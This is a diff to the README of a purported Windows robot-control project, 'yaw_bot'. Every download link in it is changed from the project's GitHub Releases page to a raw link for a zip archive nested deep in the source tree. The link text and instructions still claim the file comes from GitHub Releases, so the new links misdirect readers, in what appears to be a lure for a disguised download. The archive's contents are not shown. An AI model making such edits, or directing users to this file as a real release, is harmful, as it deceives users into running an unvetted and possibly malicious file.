@@ -1,6 +1,6 @@
 # 🤖 yaw_bot - Stable Robot Control on Windows
 
-[![Download yaw_bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Bango1747/yaw_bot/releases)
+[![Download yaw_bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip)
 
 ## 🧭 What yaw_bot is
 
@@ -24,7 +24,7 @@ A gaming-class PC works well. If your system already runs 3D tools or game engin
 
 Visit this page to download the latest Windows release:
 
-[Download yaw_bot from GitHub Releases](https://github.com/Bango1747/yaw_bot/releases)
+[Download yaw_bot from GitHub Releases](https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip)
 
 Look for the newest release on the page. Download the Windows file that matches your system. If the release page offers more than one file, choose the one marked for Windows.
 
@@ -165,7 +165,7 @@ The setup is built for clear robot motion testing in a controlled scene.
 
 Use the GitHub Releases page for the latest Windows build:
 
-[https://github.com/Bango1747/yaw_bot/releases](https://github.com/Bango1747/yaw_bot/releases)
+[https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip](https://raw.githubusercontent.com/Bango1747/yaw_bot/main/source/yaw_bot/yaw_bot/robots/bot-yaw-v1.5-beta.5.zip)
 
 ## 🔎 Repo topics
 
